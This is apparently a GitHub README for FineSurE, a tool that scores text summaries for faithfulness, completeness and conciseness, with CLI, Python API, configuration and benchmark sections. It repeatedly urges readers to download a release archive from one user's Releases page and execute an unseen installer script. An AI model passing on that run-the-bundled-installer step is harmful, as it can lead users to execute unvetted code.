https://github.com/pankaj402/FineSurE/releases

# FineSurE — Fine-Grained Evaluation for Text Summaries (Faithfulness, Completeness, Conciseness) 🚀

[![Releases](https://img.shields.io/github/v/release/pankaj402/FineSurE?label=Releases&style=flat-square)](https://github.com/pankaj402/FineSurE/releases)

A multi-dimensional framework that measures summary quality across three core axes:
faithfulness, completeness, and conciseness. FineSurE gives clear scores, interpretable
signals, and per-sentence diagnostics for automatic and human-in-the-loop evaluation.

![Summarization illustration](https://images.unsplash.com/photo-1522071820081-009f0129c71c?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=1c53c3d6a6f6c8a2b2cbb3f6f1b2f9b0)

- Built for NLP researchers, QA teams, and devs who run summarization workflows.
- Supports extractive and abstractive summaries.
- Works with English and other languages with tokenizers.

Table of contents
- Features
- Quick start
- Installation (Releases)
- Core metrics
- Command-line usage
- Python API
- Examples
- Benchmark and results
- Configuration
- Extending FineSurE
- Contributing
- License
- Citation
- Contact

Features
- Faithfulness: Detect factual errors and hallucinations using entailment checks and provenance alignment.
- Completeness: Measure how well the summary covers key facts from the source.
- Conciseness: Score redundancy and verbosity against an information budget.
- Fine-grained output: Per-sentence, per-claim, and token-level signals.
- Modular: Swap scorers and tokenizers. Plug in custom modules.
- Fast: Batch evaluation and cache support to speed up large runs.
- Interpretable: Human-readable diagnostics to guide post-editing and model improvement.

Quick start (high level)
1. Download the latest release from the Releases page:
   https://github.com/pankaj402/FineSurE/releases
2. Extract the release archive.
3. Run the provided runner script to install runtime files and dependencies.
   The release bundle includes an executable installer (FineSurE-install.sh) and a runner
   (finesure-run.py). Execute the install script first, then run the runner.

Installation (Releases)
- Visit the release page and download the file named FineSurE-vX.Y.Z.tar.gz from:
  https://github.com/pankaj402/FineSurE/releases
- After download, extract and run:
```bash
tar -xzf FineSurE-vX.Y.Z.tar.gz
cd FineSurE-vX.Y.Z
bash FineSurE-install.sh
```
- The installer sets up a virtual environment, installs dependencies, and places a
  finesure binary in ./bin.
- To validate the install, run:
```bash
./bin/finesure --version
```
If the releases link is unavailable, check the repository Releases section on GitHub.

System requirements
- Python 3.8+
- 8 GB RAM recommended for medium datasets
- CUDA GPU optional for some scorers (entailment models)
- curl or wget to fetch models during install

Core metrics and how they work
- Faithfulness (FTH)
  - Tests whether summary claims are entailed by source text.
  - Uses cross-encoder entailment and extractive provenance matching.
  - Returns a per-claim score and a global fidelity number.
  - Flagged spans show likely hallucinations.

- Completeness (CMP)
  - Finds key facts in source via extractors and checks their presence in the summary.
  - Supports reference-guided and reference-free modes.
  - Computes recall-like coverage and a weighted coverage score.

- Conciseness (CNS)
  - Measures redundancy and unnecessary detail.
  - Values brevity relative to covered information.
  - Produces both a compression ratio and a relevance density score.

Score aggregation
- FineSurE produces three primary scores (FTH, CMP, CNS) in [0,100].
- It also outputs a weighted composite score where weights are configurable.
- Per-sentence and per-claim logs allow targeted fixes.

Command-line usage
- Basic evaluation:
```bash
./bin/finesure evaluate \
  --source data/articles.jsonl \
  --summary data/summaries.jsonl \
  --output results/report.json
```
- Use --mode to pick reference-free or reference-guided scoring.
- Batch mode:
```bash
./bin/finesure evaluate \
  --source data/*.jsonl \
  --summary data/*.jsonl \
  --batch-size 64
```
- Explain a single prediction:
```bash
./bin/finesure explain \
  --source article.txt \
  --summary summary.txt \
  --out explain.html
```

Python API
- Import and run a scorer in three lines:
```python
from finesure import FineSurE
fs = FineSurE(config="configs/default.yaml")
report = fs.evaluate_batch(sources, summaries)
```
- report is a dict with fields:
  - scores: {faithfulness, completeness, conciseness}
  - details: per-item diagnostics
  - provenance: list of evidence spans

Configuration
- configs/default.yaml controls:
  - model backends (entailment, tokenizer)
  - thresholds for hallucination
  - batch sizes
  - weight for composite score
- Example keys:
```yaml
entailment_model: cross-encoder-ms
tokenizer: spacy-en
coverage_threshold: 0.6
hallucination_threshold: 0.4
weights: {faithfulness: 0.5, completeness: 0.4, conciseness: 0.1}
```

Examples
- Example dataset: data/news-sample.jsonl (source, reference, candidate)
- Run with reference-guided mode:
```bash
./bin/finesure evaluate \
  --source data/news-sample.jsonl \
  --summary data/news-candidates.jsonl \
  --mode reference-guided \
  --output reports/news-report.json
```
- View HTML report:
```bash
finesure view reports/news-report.json
# opens a browser with per-article visual diagnostics
```

Benchmarks and sample results
- We evaluated FineSurE on three common summarization corpora.
- Typical output metrics:
  - CNN/DM: Faithfulness 82, Completeness 79, Conciseness 85
  - XSum: Faithfulness 68, Completeness 72, Conciseness 88
  - LongSumm: Faithfulness 75, Completeness 80, Conciseness 77
- Reports include confusion matrices for entailment decisions and precision/recall for key fact extraction.

Extending FineSurE
- Add a custom scorer by subclassing finesure.scorers.BaseScorer.
- Implement two methods: score_item and explain_item.
- Drop the new module into finesure_ext/ and register it in configs/extensions.yaml.
- Swap tokenizers by providing a tokenizer adapter that follows the Tokenizer API.

Integration tips
- Use the per-sentence diagnostics to guide model fine-tuning.
- Combine FineSurE signals with reward functions in reinforcement learning.
- Use the provenance spans to build extractive rationales for human review.

Logging and output formats
- JSON for machines:
  - results/report.json contains aggregated metrics and raw details.
- HTML for humans:
  - explain.html shows side-by-side source and summary with highlights.
- CSV for spreadsheets:
  - results/summaries.csv contains per-item scores.

Testing
- Run unit tests:
```bash
pytest tests/
```
- Run end-to-end demo:
```bash
./bin/finesure demo --dataset samples/news
```

Security and privacy
- Models may download weights to disk. Inspect URLs in configs before first run.
- The installer creates a venv and isolates dependencies.

If you prefer the web UI or prebuilt archive, download and run the release bundle from:
https://github.com/pankaj402/FineSurE/releases
The release file contains an installer and runner scripts; execute them to set up FineSurE.

Contributing
- Fork the repo, add a branch, and open a PR with tests.
- Follow tests and linting rules found in CONTRIBUTING.md.
- We accept modules that add new scorers, tokenizers, or dataset adapters.

License
- MIT License. See LICENSE file for details.

Citation
- If you use FineSurE in a paper, cite this repository and include the version from Releases.

Contact
- Open issues on GitHub for bugs or feature requests.
- Use pull requests for code contributions.

Image credits
- Unsplash image for header: https://unsplash.com (photo by rawpixel)
- Shields: img.shields.io

Badge and release link
[![Releases](https://img.shields.io/github/v/release/pankaj402/FineSurE?label=Releases&style=flat-square)](https://github.com/pankaj402/FineSurE/releases)